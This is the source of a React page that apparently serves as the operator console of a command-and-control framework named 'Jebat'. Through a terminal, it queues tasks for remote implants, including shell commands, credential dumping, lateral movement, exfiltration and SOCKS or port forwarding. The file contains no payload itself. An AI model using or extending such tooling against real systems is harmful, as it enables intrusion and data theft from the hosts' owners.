import { useEffect, useRef, useState } from "react";
import { useParams, Link } from "react-router-dom";
import { api } from "../lib/api";
import type { Implant, Task } from "../lib/api";
import { onWsEvent } from "../lib/ws";
import { Terminal } from "@xterm/xterm";
import { FitAddon } from "@xterm/addon-fit";
import "@xterm/xterm/css/xterm.css";

const TASK_TYPES: Record<string, number> = {
  shell: 1,
  sleep: 2,
  exit: 3,
  upload: 4,
  download: 5,
  creddump: 6,
  lateralmove: 7,
  exfil: 8,
  socks: 9,
  portfwd: 10,
};

export default function Interact() {
  const { id } = useParams<{ id: string }>();
  const [implant, setImplant] = useState<Implant | null>(null);
  const [tasks, setTasks] = useState<Task[]>([]);
  const termRef = useRef<HTMLDivElement>(null);
  const terminalRef = useRef<Terminal | null>(null);
  const lineRef = useRef("");

  useEffect(() => {
    if (!id) return;
    api.getImplant(id).then((r) => setImplant(r.implant)).catch(() => {});
    api.listTasksForImplant(id).then((r) => setTasks(r.tasks)).catch(() => {});
  }, [id]);

  useEffect(() => {
    if (!termRef.current || terminalRef.current) return;

    const term = new Terminal({
      theme: {
        background: "#0a0a0a",
        foreground: "#e0e0e0",
        cursor: "#0f0",
      },
      fontFamily: "'JetBrains Mono', monospace",
      fontSize: 13,
      cursorBlink: true,
    });
    const fit = new FitAddon();
    term.loadAddon(fit);
    term.open(termRef.current);
    fit.fit();
    terminalRef.current = term;

    term.writeln("\x1b[32m[Jebat]\x1b[0m Interactive Shell");
    term.writeln("Type a command or use: shell <cmd>, sleep <ms>, exit, creddump");
    term.writeln("");
    prompt(term);

    term.onData((data) => {
      if (data === "\r") {
        term.writeln("");
        handleCommand(lineRef.current.trim(), term);
        lineRef.current = "";
      } else if (data === "\u007f") {
        if (lineRef.current.length > 0) {
          lineRef.current = lineRef.current.slice(0, -1);
          term.write("\b \b");
        }
      } else if (data >= " ") {
        lineRef.current += data;
        term.write(data);
      }
    });

    const resizer = () => fit.fit();
    window.addEventListener("resize", resizer);
    return () => {
      window.removeEventListener("resize", resizer);
      term.dispose();
      terminalRef.current = null;
    };
  }, []);

  useEffect(() => {
    if (!id) return;
    return onWsEvent((ev) => {
      if (ev.event_type === "task_complete" && ev.agent_id === id && ev.task_id) {
        api.getTask(ev.task_id).then((r) => {
          const t = r.task;
          const term = terminalRef.current;
          if (term && t.output) {
            term.writeln(`\x1b[36m[task ${t.id}]\x1b[0m ${t.output}`);
            prompt(term);
          }
          setTasks((prev) => prev.map((p) => (p.id === t.id ? t : p)));
        }).catch(() => {});
      }
    });
  }, [id]);

  const handleCommand = async (input: string, term: Terminal) => {
    if (!input || !id) {
      prompt(term);
      return;
    }

    const parts = input.split(/\s+/);
    const cmd = parts[0].toLowerCase();
    const arg = parts.slice(1).join(" ");

    if (cmd in TASK_TYPES) {
      try {
        const res = await api.queueTask(id, TASK_TYPES[cmd], arg);
        term.writeln(`\x1b[33m[queued task ${res.task_id}]\x1b[0m`);
      } catch (e: unknown) {
        term.writeln(`\x1b[31m[error] ${e}\x1b[0m`);
      }
    } else {
      try {
        const res = await api.queueTask(id, 1, input);
        term.writeln(`\x1b[33m[queued shell task ${res.task_id}]\x1b[0m`);
      } catch (e: unknown) {
        term.writeln(`\x1b[31m[error] ${e}\x1b[0m`);
      }
    }
    prompt(term);
  };

  const prompt = (term: Terminal) => {
    const host = implant?.hostname || id?.slice(0, 8) || "?";
    term.write(`\x1b[32m${host}\x1b[0m> `);
  };

  return (
    <div>
      <div style={styles.header}>
        <Link to="/implants" style={styles.back}>
          Implants
        </Link>
        <span style={styles.sep}>/</span>
        <span style={styles.agentId}>{id?.slice(0, 16)}...</span>
        {implant && (
          <span style={styles.host}>
            {implant.hostname} ({implant.status})
          </span>
        )}
      </div>
      <div ref={termRef} style={styles.term} />
      <h3 style={styles.h3}>Task History ({tasks.length})</h3>
      <div style={styles.taskList}>
        {tasks.map((t) => (
          <div key={t.id} style={styles.taskRow}>
            <span style={styles.taskId}>#{t.id}</span>
            <span style={styles.taskType}>{t.task_type_name}</span>
            <span
              style={{
                ...styles.taskStatus,
                color:
                  t.status === "completed"
                    ? "#0f0"
                    : t.status === "pending"
                      ? "#fa0"
                      : "#888",
              }}
            >
              {t.status}
            </span>
            <span style={styles.taskTime}>
              {new Date(t.created_at).toLocaleTimeString()}
            </span>
          </div>
        ))}
      </div>
    </div>
  );
}

const styles: Record<string, React.CSSProperties> = {
  header: {
    display: "flex",
    alignItems: "center",
    gap: 8,
    marginBottom: 16,
  },
  back: { color: "#0f0", textDecoration: "none", fontSize: 14 },
  sep: { color: "#333" },
  agentId: { color: "#888", fontFamily: "monospace", fontSize: 13 },
  host: { color: "#555", fontSize: 12 },
  term: {
    height: 350,
    background: "#0a0a0a",
    border: "1px solid #222",
    borderRadius: 4,
  },
  h3: { color: "#666", fontSize: 13, margin: "16px 0 8px" },
  taskList: { fontSize: 12 },
  taskRow: {
    display: "flex",
    gap: 12,
    padding: "4px 8px",
    borderBottom: "1px solid #151515",
  },
  taskId: { color: "#555", minWidth: 40 },
  taskType: { color: "#08f", minWidth: 100 },
  taskStatus: { minWidth: 80 },
  taskTime: { color: "#444" },
};
